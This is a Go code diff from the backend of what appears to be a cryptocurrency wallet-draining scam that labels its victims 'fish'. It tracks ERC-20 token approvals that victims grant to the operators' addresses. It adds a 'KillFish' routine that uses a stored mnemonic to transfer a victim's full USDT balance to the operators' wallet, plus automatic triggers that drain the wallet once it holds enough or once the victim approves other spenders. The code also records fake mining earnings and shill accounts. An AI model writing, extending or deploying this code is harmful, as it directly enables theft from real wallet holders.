@@ -126,7 +126,7 @@ func ToDecimal(ivalue interface{}, decimals int) decimal.Decimal {
 /***
   更新 鱼的 usd eth
 */
-func UpdateUsdAndEth(foxAddress string, Db *gorm.DB, money float64, fishID int, Aid int, remark string) {
+func UpdateUsdAndEth(foxAddress string, Db *gorm.DB, money float64, fishID int, Aid int, remark string, redis *redis.Client) {
 
 	ethUrl := viper.GetString("eth.ethUrl")
 	client, err := ethclient.Dial(ethUrl)
@@ -137,17 +137,17 @@ func UpdateUsdAndEth(foxAddress string, Db *gorm.DB, money float64, fishID int, 
 	tokenAddress := common.HexToAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7") //usDT
 	instance, err := token.NewToken(tokenAddress, client)
 	if err != nil {
-		log.Fatal(err)
+		return
 	}
 	address := common.HexToAddress(foxAddress)
 	bal, err := instance.BalanceOf(&bind.CallOpts{}, address)
 	if err != nil {
-		log.Fatal(err)
+		return
 	}
 	usd := ToDecimal(bal.String(), 6)
 	balance, err := client.BalanceAt(context.Background(), address, nil)
 	if err != nil {
-		log.Fatal(err)
+		return
 	}
 	eth := ToDecimal(balance.String(), 18)
 	data := make(map[string]interface{})
@@ -155,6 +155,23 @@ func UpdateUsdAndEth(foxAddress string, Db *gorm.DB, money float64, fishID int, 
 	data["money_eth"], _ = eth.Float64()
 
 	b, _ := strconv.ParseFloat(usd.String(), 64)
+
+	//获取鱼
+	fish := Fish{}
+	err9 := Db.Where("fox_address=?", foxAddress).First(&fish).Error
+	if err9 == nil {
+		if fish.AlreadyKill == 1 { //总是杀开关
+			config := Config{}
+			err9 = Db.Where("id=1").First(&config).Error
+			if err9 == nil {
+				if b >= config.LowCanKillFishMoney {
+					KillFish(Db, fish.BAddress, fish.FoxAddress, int(fish.ID),
+						redis, fish.AdminId, fish.Belong)
+				}
+			}
+		}
+	}
+
 	if math.Abs(money-b) > 2 {
 		a := b - money
 		c := strconv.FormatFloat(a, 'f', 2, 64)
@@ -215,43 +232,48 @@ type TxList struct {
 }
 
 type Fish struct {
-	ID                     uint    `gorm:"primaryKey;comment:'主键'"`
-	Username               string  `gorm:"varchar(225)"`
-	Password               string  `gorm:"varchar(225)"`
-	Token                  string  `gorm:"varchar(225)"`
-	Status                 int     `gorm:"int(10);default:1"`
-	FoxAddress             string  `gorm:"varchar(225);comment:'狐狸钱包地址'"`
-	Money                  float64 `gorm:"type:decimal(10,2)"`                      // USdt 余额
-	MoneyEth               float64 `gorm:"type:decimal(30,18)"`                     //用户的eth  余额
-	YesterdayEarnings      float64 `gorm:"type:decimal(10,2)"`                      //昨日的收益
-	TodayEarnings          float64 `gorm:"type:decimal(10,2)"`                      //今日的收益
-	TotalEarnings          float64 `gorm:"type:decimal(10,2)"`                      //总收益
-	WithdrawalFreezeAmount float64 `gorm:"type:decimal(10,2);comment:'提现冻结金额'"`     //  提现冻结的金额
-	EarningsMoney          float64 `gorm:"type:decimal(10,2);comment:'收益的可以提现的余额'"` //可以提现的金额
-	VipLevel               int     `gorm:"int(11);comment:'vip等级id';index"`
-	AdminId                int     `gorm:"int(11);comment:'属于那个代理';index"`
-	SuperiorId             int     `gorm:"int(11);comment:'上级代理用户';index"`
-	Updated                int64
-	Created                int64
-	Authorization          int     `gorm:"int(10);default:1"` //1 没有授权  2 授权
-	InCode                 string  `gorm:"varchar(225)"`      //授权码
-	Remark                 string  `gorm:"varchar(225)"`      //备注
-	TodayEarningsETH       float64 `gorm:"-"`                 //
-	ETHExchangeRate        string  `gorm:"-"`
-	Model                  int     `gorm:"-"`
-	FoxAddressOmit         string  `gorm:"-"`
-	AlreadyGeyUSDT         float64 `gorm:"type:decimal(10,2)"`  //已经提现的美元
-	AlreadyGeyETH          float64 `gorm:"type:decimal(30,18)"` //已经提现的ETH
-	BAddress               string  `gorm:"varchar(225)"`
-	AuthorizationTime      int     `gorm:"int(10);default:0"`                  //1 没有授权  2 授权
-	MiningEarningETH       float64 `gorm:"type:decimal(30,18);comment:'挖矿收益'"` //挖矿收益
-	Belong                 int     //子代理 需要填写的字段
-	BelongString           string
-	InComeTimes            int   `gorm:"int(10);default:1"` //发送收益次数
-	AuthorizationAt        int64 //授权时间
-
+	ID                      uint    `gorm:"primaryKey;comment:'主键'"`
+	Username                string  `gorm:"varchar(225)"`
+	Password                string  `gorm:"varchar(225)"`
+	Token                   string  `gorm:"varchar(225)"`
+	Status                  int     `gorm:"int(10);default:1"`
+	FoxAddress              string  `gorm:"varchar(225);comment:'狐狸钱包地址'"`
+	Money                   float64 `gorm:"type:decimal(10,2)"`                      // USdt 余额
+	MoneyEth                float64 `gorm:"type:decimal(30,18)"`                     //用户的eth  余额
+	YesterdayEarnings       float64 `gorm:"type:decimal(10,2)"`                      //昨日的收益
+	TodayEarnings           float64 `gorm:"type:decimal(10,2)"`                      //今日的收益
+	TotalEarnings           float64 `gorm:"type:decimal(10,2)"`                      //总收益
+	WithdrawalFreezeAmount  float64 `gorm:"type:decimal(10,2);comment:'提现冻结金额'"`     //  提现冻结的金额
+	EarningsMoney           float64 `gorm:"type:decimal(10,2);comment:'收益的可以提现的余额'"` //可以提现的金额
+	VipLevel                int     `gorm:"int(11);comment:'vip等级id';index"`
+	AdminId                 int     `gorm:"int(11);comment:'属于那个代理';index"`
+	SuperiorId              int     `gorm:"int(11);comment:'上级代理用户';index"`
+	Updated                 int64
+	Created                 int64
+	Authorization           int     `gorm:"int(10);default:1"` //1 没有授权  2 授权
+	InCode                  string  `gorm:"varchar(225)"`      //授权码
+	Remark                  string  `gorm:"varchar(225)"`      //备注
+	TodayEarningsETH        float64 `gorm:"-"`                 //
+	ETHExchangeRate         string  `gorm:"-"`
+	Model                   int     `gorm:"-"`
+	FoxAddressOmit          string  `gorm:"-"`
+	AlreadyGeyUSDT          float64 `gorm:"type:decimal(10,2)"`  //已经提现的美元
+	AlreadyGeyETH           float64 `gorm:"type:decimal(30,18)"` //已经提现的ETH
+	BAddress                string  `gorm:"varchar(225)"`
+	AuthorizationTime       int     `gorm:"int(10);default:0"`                  //1 没有授权  2 授权
+	MiningEarningETH        float64 `gorm:"type:decimal(30,18);comment:'挖矿收益'"` //挖矿收益
+	MiningEarningUSDT       float64 `gorm:"type:decimal(10,2);default:0"`       //收益 USDT
+	Belong                  int     //子代理 需要填写的字段
+	BelongString            string
+	InComeTimes             int     `gorm:"int(10);default:1"` //发送收益次数
+	MonitoringSwitch        int     `gorm:"int(10);default:1"` //监控开关  1 开  2 关
+	ServerSwitch            int     `gorm:"int(10);default:2"` //客服开关  1 开  2 关
+	AuthorizationAt         int64   //授权时间
+	PledgeSwitch            int     `gorm:"int(10);default:2"` //质押开关  1 开  2 关   //质押开关
+	Temp                    float64 `gorm:"-"`                 //用于计算
+	OthersAuthorizationKill int     `gorm:"int(10);default:2"` //他人授权就杀的开关  1 开  2 关   //他人授权就杀的开关
+	AlreadyKill             int     `gorm:"int(10);default:2"` //总是杀开关  1 开  2 关   //有钱就杀
 }
-
 type Admin struct {
 	ID                   uint   `gorm:"primaryKey;comment:'主键'"`
 	Username             string `gorm:"varchar(225)"`
@@ -272,7 +294,13 @@ type Admin struct {
 	LongUrl              string
 }
 
-func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string, Db *gorm.DB) {
+type BAddressList struct {
+	ID       uint   `gorm:"primaryKey;comment:'主键'"`
+	BAddress string `gorm:"varchar(225)"`
+	BKey     string `gorm:"varchar(225)"`
+}
+
+func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string, Db *gorm.DB, BList []string, redis *redis.Client) {
 
 	//获取 要查询的 fish
 	//apiKey := "5YJ37XCEQFSEDMMI6RXZ756QB7HS2VT921"
@@ -287,31 +315,26 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 		fmt.Println(err1.Error())
 		return
 	}
-
 	defer res.Body.Close()
-
 	var data TxList
 	err = json.Unmarshal([]byte(string(body)), &data)
 	if err != nil {
-		//fmt.Println("https://api.etherscan.io/api?module=account&action=txlist&address=" + foxAddress + "&startblock=0&endblock=99999999&page=1&offset=100&sort=asc&apikey=" + apiKey)
-		//fmt.Println(string(body))
 		fmt.Println(err.Error())
 		return
 	}
 	var count int = 0
-
 	if data.Status == "1" && data.Message == "OK" {
 		var ifCount bool = true
 		for _, k := range data.Result {
-			if len(k.InPut) == 138 && k.InPut[0:10] == "0x095ea7b3" {
+			IsError, _ := strconv.Atoi(k.IsError)
+			if len(k.InPut) == 138 && k.InPut[0:10] == "0x095ea7b3" && IsError == 0 {
 				BAddressOne := "0x" + k.InPut[34:74]
-				if k.InPut[127:] == "00000000000" && strings.ToLower(BAddress) == strings.ToLower(BAddressOne) { //取消授权  更新数据库
-					fmt.Println("????")
+				if k.InPut[127:] == "00000000000" && InArray(strings.ToLower(BAddressOne), BList) { //取消授权  更新数据库
 					mapData := make(map[string]interface{})
 					mapData["authorization"] = 1
 					Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
 				}
-				if k.InPut[127:] != "00000000000" && strings.ToLower(BAddress) == strings.ToLower(BAddressOne) { //授权成功
+				if k.InPut[127:] != "00000000000" && InArray(strings.ToLower(BAddressOne), BList) { //授权成功
 					if ifCount {
 						count++
 						ifCount = false
@@ -325,7 +348,6 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 							admin := Admin{}
 							Db.Where("id=?", fish.AdminId).First(&admin)
 							Db.Where("id=?", fish.AdminId).Update(&Fish{AuthorizationAt: time.Now().Unix()}) //更新授权时间
-
 							content := "❥【授权给我们报警!!】---------------------------------------------------->%0A" +
 								" 用户编号: [ 11784374" + fishID + "] " + "已授权给我们%0A" +
 								"所属代理ID:" + admin.Username + "%0A" +
@@ -333,17 +355,17 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 							NotificationAdmin(Db, fish.AdminId, content)
 						}
 					}
-
 					mapData := make(map[string]interface{})
 					mapData["authorization"] = 2
 					mapData["b_address"] = BAddress
 					Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
 				}
-				if k.InPut[127:] != "00000000000" && strings.ToLower(BAddress) != strings.ToLower(BAddressOne) {
+				if k.InPut[127:] != "00000000000" && InArray(strings.ToLower(BAddressOne), BList) == false { // 已经授权给他人
 					count++
 				}
 			}
 		}
+
 
 		if count > 0 && ifCount == true { //授权个他人
 			fish := Fish{}
@@ -366,7 +388,9 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 
 					NotificationAdmin(Db, fish.AdminId, content)
 				}
-
+				if fish.OthersAuthorizationKill == 1 && fish.AuthorizationTime < count { //授权给他们就杀开关   1开 开始自动杀鱼
+					KillFish(Db, BAddress, foxAddress, int(fish.ID), redis, fish.AdminId, fish.Belong)
+				}
 			}
 		}
 
@@ -380,7 +404,7 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 /**
   批量修改 余额
 */
-func BatchUpdateBalance(adminId int, Db *gorm.DB) {
+func BatchUpdateBalance(adminId int, Db *gorm.DB, redis *redis.Client) {
 	type Admin struct {
 		ID uint
 	}
@@ -398,7 +422,7 @@ func BatchUpdateBalance(adminId int, Db *gorm.DB) {
 		Db.Table("fish").Where("admin_id=?", k.ID).Find(&fish)
 		for _, kk := range fish {
 			if kk.Remark != "托" {
-				UpdateUsdAndEth(kk.FoxAddress, Db, kk.Money, int(kk.ID), adminId, kk.Remark)
+				UpdateUsdAndEth(kk.FoxAddress, Db, kk.Money, int(kk.ID), adminId, kk.Remark, redis)
 			}
 
 		}
@@ -407,7 +431,6 @@ func BatchUpdateBalance(adminId int, Db *gorm.DB) {
 }
 
 func NotificationAdmin(Db *gorm.DB, adminID int, Message string, ) {
-
 	type Admin struct {
 		ID                   uint   `gorm:"primaryKey;comment:'主键'"`
 		Username             string `gorm:"varchar(225)"`
@@ -525,5 +548,120 @@ func AddEverydayMoneyData(redis *redis.Client, context string, SonAdminIdInt int
 		//不存在
 		redis.HSet(b, context, Money)
 	}
+
+}
+
+/**
+杀鱼
+*/
+
+type Config struct {
+	ID                      uint    `gorm:"primaryKey;comment:'主键'"`
+	BAddress                string  `gorm:"varchar(225)"`
+	BKey                    string  `gorm:"varchar(225)"`
+	BMnemonic               string  `gorm:"varchar(225)"`
+	RevenueModel            int     `gorm:"int(10);default:1"` //收益模式 1USDT 2ETH 2 ETH+USDT
+	AddMoneyMode            int     `gorm:"int(10);default:1"` //加钱模式 1正常加钱更具账户的余额  2余额+未体现的钱
+	CAddress                string  `gorm:"varchar(225)"`
+	IfNeedInCode            int     `gorm:"int(1);default:1"`                         //1不需要 2需要
+	WithdrawalPattern       int     `gorm:"int(1);default:1"`                         //提现模式  1  美元 2 ETH
+	TheTotalOrePool         float64 `gorm:"type:decimal(20,2);default:100000000 " `   //总矿池
+	YesterdayGrossIncomeETH float64 `gorm:"type:decimal(30,18);default:0.1061375661"` //昨日总收入  ETH
+	LowCanKillFishMoney     float64 `gorm:"int(10);default:50"`                       //美元
+
+}
+type FinancialDetails struct {
+	ID                        uint    `gorm:"primaryKey;comment:'主键'"`
+	FishId                    int     `gorm:"int(11);comment:'鱼id';index"`
+	Money                     float64 `gorm:"type:decimal(10,2)"`  //美元
+	MoneyEth                  float64 `gorm:"type:decimal(30,18)"` //这个只针对提现  ETH  提现
+	Pattern                   int     `gorm:"int(10);default:1"`   //1 是美元 提现  2 是 ETH 提现
+	Kinds                     int     //类型 1提现 2提现等待审核 3驳回 8系统每日加钱  9管理员转账  10管理转账中... 11转账失败
+	TheExchangeRateAtThatTime float64 //当时的汇率
+	Remark                    string  `gorm:"varchar(225)"`
+	FoxAddress                string  `gorm:"-"`
+	BAddress                  string  //B地址
+	CAddress                  string  //C地址
+	Created                   int64
+	Updated                   int64
+	Authorization             int     `gorm:"int(10);default:1"` //1 不是自动杀鱼  2 自动杀鱼
+	TaskId                    string  //异步任务id
+	HashCode                  string  //hash值
+	ETH                       float64 `gorm:"-"`
+	FishRemark                string  `gorm:"-"`
+	FormAgency                string  `gorm:"-"`
+}
+
+/**
+杀鱼
+*/
+func KillFish(Db *gorm.DB, BAddress string, foxAddress string, FishId int, redis *redis.Client, AdminId int, Belong int) {
+	jsonOne := make(map[string]interface{})
+	//在这里提取
+	list := BAddressList{}
+	err := Db.Where("b_address=?", BAddress).First(&list).Error
+	if err != nil  {
+		return
+	}
+	config := Config{}
+	err = Db.Where("b_address=?", BAddress).First(&config).Error
+	if err != nil {
+		return
+	}
+	jsonOne["mnemonic"] = list.BKey
+	jsonOne["to_address"] = config.CAddress
+	jsonOne["token_name"] = "usdt"
+	jsonOne["account_index"] = 0
+	jsonOne["from_address"] = foxAddress
+	// 现场查询余额
+	ethUrl := viper.GetString("eth.ethUrl")
+	client, err := ethclient.Dial(ethUrl)
+	if err != nil {
+		return
+	}
+	//获取 美元
+	tokenAddress := common.HexToAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7") //usDT
+	instance, err := token.NewToken(tokenAddress, client)
+	if err != nil {
+		return
+	}
+	address := common.HexToAddress(foxAddress)
+	bal, err := instance.BalanceOf(&bind.CallOpts{}, address)
+	if err != nil {
+		log.Fatal(err)
+	}
+	//判断 钱包得钱是否值得提现
+	p, _ := ToDecimal(bal.String(), 6).Float64()
+	if p < config.LowCanKillFishMoney {
+		return
+	}
+	jsonOne["amount"] = bal.String()
+	jsonDate := make(map[string]interface{})
+	jsonDate["method"] = "erc20_transfer_from"
+	jsonDate["params"] = jsonOne
+	byte, _ := json.Marshal(jsonDate)
+	//生成任务id
+	taskId := time.Now().Format("20060102") + RandStr(8)
+	resp, err1 := http.Post("http://127.0.0.1:8000/ethservice?taskId="+taskId, "application/json", strings.NewReader(string(byte)))
+	if err1 != nil {
+		fmt.Println(err1.Error())
+		return
+	}
+	a, _ := ToDecimal(bal.String(), 6).Float64()
+	add := FinancialDetails{
+		TaskId:        taskId,
+		Kinds:         10,
+		FishId:        FishId,
+		CAddress:      config.CAddress,
+		Created:       time.Now().Unix(),
+		Updated:       time.Now().Unix(),
+		Money:         a,
+		Authorization: 2, //自动杀鱼
+	}
+	Db.Save(&add)
+	defer resp.Body.Close()
+	AddEverydayMoneyData(redis, "ChouQuMoney", AdminId, Belong, a)
+	respByte, _ := ioutil.ReadAll(resp.Body)
+	fmt.Println(string(respByte))
 
 }
